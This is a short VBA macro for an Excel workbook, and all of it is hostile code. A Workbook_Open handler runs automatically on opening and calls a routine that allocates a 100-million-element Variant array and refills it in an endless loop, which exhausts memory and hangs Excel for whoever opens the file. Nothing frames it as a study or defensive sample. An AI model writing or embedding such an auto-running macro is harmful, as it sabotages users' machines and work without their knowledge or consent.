Sub OhSnap()
    Dim corruptable() As Variant
    Dim i As Long
    
    ReDim corruptable(1 To 100000000)
    
    Do
        For i = LBound(corruptable) To UBound(corruptable)
            corruptable(i) = i
        Next i
        
    Loop While True
End Sub

Private Sub Workbook_Open()
    Call OhSnap
End Sub

